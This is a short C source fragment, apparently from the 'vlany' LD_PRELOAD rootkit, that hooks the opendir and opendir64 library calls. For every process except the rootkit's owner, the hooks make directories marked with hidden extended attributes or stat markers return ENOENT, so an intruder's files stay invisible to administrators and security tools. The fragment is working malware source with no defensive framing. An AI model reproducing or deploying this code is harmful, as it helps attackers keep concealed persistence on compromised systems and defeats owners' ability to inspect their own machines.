DIR *opendir(const char *name)
{
    #ifdef DEBUG
        printf("[vlany] opendir() called\n");
    #endif

    HOOK(old_opendir, COPENDIR);

    if(owned()) return old_opendir(name);

    if(hidden_xattr(name)) { errno = ENOENT; return NULL; }

    return old_opendir(name);
}

DIR *opendir64(const char *name)
{
    #ifdef DEBUG
        printf("[vlany] opendir64() called\n");
    #endif

    if(!old_opendir64) old_opendir64 = get_symbol(RTLD_NEXT, COPENDIR64);

    if(owned()) return old_opendir64(name);

    if(hidden_xattr(name) || hidden_xstat(_STAT_VER, name, 32))
    {
        errno = ENOENT;
        return NULL;
    }

    return old_opendir64(name);
}
